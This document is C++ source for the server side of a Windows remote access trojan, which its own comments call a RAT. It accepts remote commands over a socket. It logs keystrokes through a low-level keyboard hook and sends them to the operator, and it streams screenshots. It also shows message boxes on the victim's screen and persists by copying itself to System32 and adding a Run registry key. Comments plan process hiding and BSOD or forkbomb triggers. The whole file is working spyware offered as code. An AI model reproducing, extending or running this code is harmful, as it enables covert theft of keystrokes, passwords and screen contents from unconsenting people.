#include "server_header.h"

int main(){

    //AddtoStartup();

//map the server enumerated commands so I can recv a string to match with!
    dictionary["TRIGMSGBOX"] = TRIGMSGBOX;

    dictionary["KEYLOG"] = KEYLOG;
    dictionary["STOPKEYLOG"] = STOPKEYLOG;

    dictionary["DISCONNECT"] = DISCONNECT;

    dictionary["STREAMPICT"] = STREAMPICT;


//Map messagebox responses!
    MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
    MSGBOX_TYPES["Help MsgBox"] /*NOTE:WM_HELP NOT USED*/ = MB_HELP;
    MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
    MSGBOX_TYPES["Yes No"]                                = MB_YESNO;


    MSGBOX_ICONS["Exclamation Icon"]      = MB_ICONEXCLAMATION;
    MSGBOX_ICONS["Warning Icon"]          = MB_ICONWARNING;
    MSGBOX_ICONS["Error Icon"]            = MB_ICONINFORMATION;
    MSGBOX_ICONS["Stop Icon"]             = MB_ICONSTOP;



/*INITIALIZE WINSOCKETS FOR OUR RAT, WE WILL BE COMMUNICATING WITH CLIENT TO MANIPULATE THE HOST*/



    HandleError(WSAStartup(MAKEWORD(2,2), &wsa));

    HandleError((sa = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET);


    server.sin_addr.s_addr = inet_addr (ipaddress.c_str());      //initialize members of server structure
    server.sin_family = AF_INET;
    server.sin_port = htons(portnumber);

    HandleError(bind(sa, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR);

    HandleError(listen(sa, SOMAXCONN));

    while(KILLSERVER){


        clientsock = accept(sa, (struct sockaddr *)&client, NULL);
        //HandleError(clientsock);
        //send(clientsock, "Message!", 9, 0);

        while(1){

        if(clientsock == INVALID_SOCKET){
            break;
        }
        int counter = 0;

        //memsuet(server_reply, '\0', buffersize);



                /*NOTE: MESSAGES WILL BE SENT IN OPERATOR>OPERAND< FORMAT. MEANING THAT THE > SYMBOL DISTINGUISHES BETWEEN THE TWO. */
                /* THE < SYMBOL DENOTES END OF MESSAGE*/
                /*FOR EXAMPLE, IF WE WANT TO MAKE A MESSAGEBOX DISPLAYING HELLO, WE WOULD SAY MSGBOXTRIG>CONTENT< */
                /*Messagebox contents will be sent as follows: title/message-MSGBOXSTYLE_ICON */
                /*Therefore, the complete syntax would be:  TRIGMSGBOX>myTitle/myMessage-MSGBOXTYLE_MESSAGEBOXICON< */
                /*SOMETIMES THERE WILL BE NO OPERAND, JUST AN OPERATOR*/
                /*FOR EXAMPLE, IT MAKES NO SENSE TO HAVE AN OPERATOR TO TRIGGER A BSOD. THEREFORE, THE SYNTAX FOR THAT WILL BE*/
                /*TRIGGERBSOD><*/
                /*LETS SAY WE WANT TO DO SOME SKID SHIT LIKE TRIGGER A FORKBOMB WITH THE CLIENT. THE OPERATOR AND OPERAND WOULD BE SOMETHING LIKE*/
                /*FORKTRIGGER><*/
                /*OR WE WANT TO SUSPEND THE COMPUTER FOR A LIMITED AMOUNT OF SECONDS*/
                /*SUSPENDHOST>45<*/


            //send(clientsock, "KEYLOG><", 8, 0);
            PKT pkt;

            HandleError(recv(clientsock, (char*)&pkt, sizeof(pkt), 0));

            //string COMMAND(pkt.command);

            //map<string, SERVERMESSAGE>::iterator i = dictionary.find(COMMAND);


        //CLEAR STRING BEFORE PROCESSING! MAKES THINGS NICE AND CLEAN!!
        server_operator.clear();
        server_operand.clear();
        server_operator.append(pkt.command);
        //After we recieve which operation to do, then we filter it in the switch.
        //After stepping through the switch, parse the data into appropriate means.
        //Each command has a different way of dealing with data.

        //server_operand.append(pkt.data);

            /*int forcount = 0;
            //PARSE THE OPERATOR
            for (; server_reply[forcount] != '>'; forcount++){
               server_operator += server_reply[forcount];
            }

            //PARSE THE OPERAND
            forcount++;
            for (; server_reply[forcount] != '<'; forcount++){

                server_operand += server_reply[forcount];

            }*/


             map<string, SERVERMESSAGE>::iterator i = dictionary.find(server_operator);


            //i->second corresponds to the enumerated message

            switch(i->second){

                case TRIGMSGBOX:{

                      server_operand.append(reinterpret_cast<const char*>(pkt.data));

                      HandleError(_beginthreadex(NULL, 0, &TrigBox, &server_operand, 0, NULL));  //not really necessary to create an unused handle, but its here incase you need to use it



                    }break;
                case KEYLOG:

                      HandleError(_beginthreadex(NULL,0, &KeyLog, NULL, 0, &KEYLOG_ID));

                    break;

                case STREAMPICT:{

                      HandleError(_beginthreadex(NULL, 0, &StreamPict, NULL, 0, NULL));

                }
                    break;





                case STOPKEYLOG: HandleError(PostThreadMessage(KEYLOG_ID, WM_QUIT, NULL, NULL));
                    break;
                case DISCONNECT: clientsock = INVALID_SOCKET;
                    break;
                default: HandleError(MessageBox(NULL, "Message unrecognized!", "Exception!", NULL));
                    break;

            }

               //send(clientsock, "Ack", 4, 0);
        }



    }
    HandleError(MessageBox(NULL,"D/c", NULL,NULL));
            closesocket(sa);
            WSACleanup();

    return 0;
}

unsigned int __stdcall KeyLog(void* data){

    HINSTANCE hinst = GetModuleHandle(NULL);
    HHOOK hhkLowLevelKybd  = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);

    MSG msg;

    //MessageBox(NULL, "entered", NULL, NULL);

        while(GetMessage(&msg, NULL, 0, 0)){
            TranslateMessage(&msg);
            DispatchMessage(&msg);

        }

      HandleError(UnhookWindowsHookEx(hhkLowLevelKybd));

}

unsigned int __stdcall TrigBox(void* data){

/*  map<string, UINT> MSGBOX_TYPES;
    MSGBOX_TYPES["Abort Retry Ignore"]                    = MB_ABORTRETRYIGNORE;
    MSGBOX_TYPES["Help MsgBox (note WM_HELP not used)"]   = MB_HELP;
    MSGBOX_TYPES["Ok Cancel"]                             = MB_OKCANCEL;
    MSGBOX_TYPES["Yes No"]                                = MB_YESNO;

    map<string, UINT> MSGBOX_ICONS;
    MSGBOX_ICONS["Exclamation Icon"]      = MB_ICONEXCLAMATION;
    MSGBOX_ICONS["Warning Icon"]          = MB_ICONWARNING;
    MSGBOX_ICONS["Error Icon"]            = MB_ICONINFORMATION;
    MSGBOX_ICONS["Stop Icon"]             = MB_ICONSTOP;*/

    string operand = *(string*)data;
    //four components, the Title, message, unittype, unitico

    string components[4];
    string::iterator it;

    int counter = 0;
        for ( it = operand.begin() ; it < operand.end(); it++ ){
        //parse the message processed! into 4 components. run it in a debugger and you'll see!
            if(*it == '/' || *it == '-' || *it == '_'){
                it++;
                counter++;
            }
                components[counter] += *it;
        }

     map<string, UINT>::iterator icon = MSGBOX_ICONS.find(components[3].c_str());

     map<string, UINT>::iterator style = MSGBOX_TYPES.find(components[2].c_str());

     HandleError(MessageBox(NULL, components[1].c_str(), components[0].c_str(), icon->second|style->second));



    return 0;
}

void AddtoStartup(){
 /*FIRST THING WE DO IS COPY SERVER.EXE TO SYSTEM32 FOLDER AND THEN MAKE A REGISTRY KEY THAT OPENS SERVER.EXE AT STARTUP*/
    //NOTE we still have to implement the process hiding in task manager!~
    std::string filename ="\\";
    char system[MAX_PATH];
    char pathtofile[MAX_PATH];

    //GET MODULE HANDLE OF CALLING PROGRAM I.E SERVER.EXE'S HANDLE
    HMODULE GetModH = GetModuleHandle(NULL);

    //GET PATH OF SERVER.EXE
    HandleError(GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile)));

    filename.append(PathFindFileNameA(pathtofile));

    //GET SYSTEM DIRECTORY LIKE SYSTEM32 OR SYSWOW64, FOR COMPATIBILITY REASONS
    HandleError(GetSystemDirectory(system,sizeof(system)));

    //APPEND MY FILENAME AFTER THE SYSTEMDIRECTORY SO WE CAN DROP OUR SERVER INTO THE SYSTEM 32 FOLDER
    strcat(system, filename.c_str());

    //COPY SERVER TO THE SYSTEM32 FOLDER
    HandleError(CopyFile(pathtofile,system,false));

    //MAKE A REGISTRY KEY TO THE SYSTEM32FOLDER WITH SERVER.EXE TO RUN AT STARTUP
    HKEY hKey;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );


    RegSetValueEx(hKey, "serv",0,REG_SZ,(const unsigned char*)system,sizeof(system));

    RegCloseKey(hKey);
}

int HandleError(int error){

    if ( error < 0){

        stringstream ss;
        ss <<"Error Server: " << GetLastError() << " From WSAGetLastError() From WSAStart() !";
        MessageBox(NULL, ss.str().c_str(), " Winsock Error! ", MB_OK | MB_ICONINFORMATION);

    }else return 0;

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){

    PKT keypkt;
    strncpy(keypkt.command, "KEYLOG\0", 7);

    extern SOCKET clientsock;
    PKBDLLHOOKSTRUCT structdll = (PKBDLLHOOKSTRUCT) lParam;

    switch(nCode){

        case HC_ACTION:
            switch(wParam){

                case WM_KEYDOWN:{


                    //How should i change the following lines?

                    char buffer[256]{};
                    GetKeyNameText((MapVirtualKey(structdll->vkCode, 0)<<16), buffer, 50);
                    //use this?: ToAscii(structdll->vkCode, structdll->scanCode, NULL, myword, 0);

                    strncpy(reinterpret_cast<char *>(keypkt.data), buffer, sizeof(buffer));
                    //std::cout <<"\n"<<KEYLOGstr;

                    //timer = clock();
                    //if ((timer / CLOCKS_PER_SEC) % 3 == 0){

                      //  MessageBox(NULL, KEYLOGstr.c_str(), "MSGBOX", NULL);
                      HandleError(send(clientsock, (char *)&keypkt, sizeof(keypkt), 0));
                    //}

                }
                break;
            }
        break;
    }

return CallNextHookEx(NULL, nCode, wParam,lParam);

}

unsigned int __stdcall StreamPict(void* arglist){

    while(1){

        unsigned int framecount;
        unsigned char *lpbitmap;
        unsigned char *comprbuff;
        ULONG buffersz, bitmapsize;
        IMAGE_PKT_HEADER *pkthdr;
        PKT *pak, *PACKETS;

        extern SOCKET clientsock;

        //framecount++;

        HDC handle_ScreenDC = GetDC(NULL);
        HDC handle_MemoryDC = CreateCompatibleDC(handle_ScreenDC);
        BITMAP bitmap;


        int x = GetDeviceCaps(handle_ScreenDC, HORZRES);
        int y = GetDeviceCaps(handle_ScreenDC, VERTRES);

        HBITMAP handle_Bitmap = CreateCompatibleBitmap(handle_ScreenDC, 640, 360);
        SelectObject(handle_MemoryDC, handle_Bitmap);

        SetStretchBltMode(handle_MemoryDC, HALFTONE);
        //SetStretchBltMode(handle_ScreenDC, HALFTONE);
        StretchBlt(handle_MemoryDC, 0, 0, 640, 360, handle_ScreenDC, 0, 0, x, y, SRCCOPY);

        //StretchBlt(handle_MemoryDC, 0, 0, x, y, handle_ScreenDC, 0, 0, SRCCOPY);

        GetObject(handle_Bitmap, sizeof(BITMAP), &bitmap);

        //BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER *bi = new BITMAPINFOHEADER;

        bi->biSize = sizeof(BITMAPINFOHEADER);
        bi->biWidth = bitmap.bmWidth;
        bi->biHeight = bitmap.bmHeight;
        bi->biPlanes = 1;
        bi->biBitCount = 16;
        bi->biCompression = BI_RGB;
        bi->biSizeImage = 0;
        bi->biXPelsPerMeter = 0;
        bi->biYPelsPerMeter = 0;
        bi->biClrUsed = 0;
        bi->biClrImportant = 0;
        //std::cout<< bitmap.bmWidth;
        bitmapsize =((bitmap.bmWidth * bi->biBitCount + 5) / 32) * 4 * bitmap.bmHeight;
        //int i = bitmap.bmWidth;
        //DWORD bitmapsize = 99;

        //HANDLE hDIB = GlobalAlloc(GHND, bitmapsize);


        lpbitmap = new unsigned char[bitmapsize]; //Uncompressed buffer
        buffersz = (bitmapsize * 1.1)+12; //Allocate breathing room for compression

        comprbuff = new unsigned char[buffersz];  //Compressed Buffer
        memset(comprbuff, 0, buffersz); //Clear Memory in char array

        GetDIBits(handle_MemoryDC, handle_Bitmap, 0, (UINT)bitmap.bmHeight, lpbitmap , (BITMAPINFO *)bi, DIB_RGB_COLORS);

        compress(comprbuff, &buffersz, lpbitmap, bitmapsize);

        //cout << result;
            //unsigned char *newbuff = new unsigned char[bitmapsize];
        //result = uncompress(newbuff, &dwBmpSize, buff, buffersz);

        //cout << result;


        //new image_pkt_header in heap, then we put the packet_expected: dividing the size of GetDIBITs by 4096, and ceiling it. result is 704 INT.
        //Then we assign bitmapinfoheader to the IMAGE_PKT_HEADER field.

        pkthdr = new IMAGE_PKT_HEADER;

        pkthdr->packet_expected = ceil((double)buffersz / 4096);
        pkthdr->bitmaphdr = *bi;
        pkthdr->uncompressed_size = bitmapsize;
        pkthdr ->compressed_Size = buffersz;
        pkthdr->origx = x;
        pkthdr->origy = y;




        //ignore strncpy(pkthdr.command, "BITMAPHDR\0", 10);
        pak = new PKT;
        memset(pak->data, '\0', sizeof(pak->data));
        memcpy(pak->data, pkthdr, sizeof(*pkthdr));
        //Then we assign the string for the command char array.
        strncpy(pak->command, "BITMAPHDR\0", 11);

    //ignore the cout, it was for debugging
        //cout << pak->command;
        //std::cout << ((IMAGE_PKT_HEADER *)pak->data)->packet_expected;

        //cout << pkthdr->packet_expected;

    //Remember the 704 integer i mentioned?
    //We make 704 packets for the GetDIBIts
            PACKETS = new PKT[pkthdr->packet_expected];


    //Then for each of those packets we assign the command char array
        //Once we have all the 704 structures command data field assigned
        for (int i = 0; i < pkthdr->packet_expected; i++){
            strncpy(PACKETS[i].command, "BITMAPDATA\0", 11);
        }


        unsigned int bitcount = 0;
        for (int i = 0; i < pkthdr->packet_expected; i++){

            memset(PACKETS[i].data, '\0', sizeof(PACKETS[i].data));

            for (int x = 0; x < 4096 && bitcount < buffersz; x++){


                PACKETS[i].data[x] = comprbuff[bitcount];
                bitcount++;

            }

        }

            HandleError(send(clientsock, (char *)pak, sizeof(PKT), 0));

        for (int i = 0; i < pkthdr->packet_expected; i++){

            HandleError(send(clientsock, (char *)&PACKETS[i], sizeof(PACKETS[i]), 0));
        }

        PKT end_pic;
        strncpy(end_pic.command, "BITMAPEND\0", 10);

            HandleError(send(clientsock, (char *)&end_pic, sizeof(end_pic), 0));

        delete pak;
        delete pkthdr;
        delete bi;
        delete[] PACKETS;
        delete[] comprbuff;
        delete[] lpbitmap;

        Sleep(100);

    }

    //std::cout << "Compressed Size: " << buffersz << "\nNumber of Packets: " << pkthdr->packet_expected << "\nUncompressed Size" << pkthdr->uncompressed_size;

}

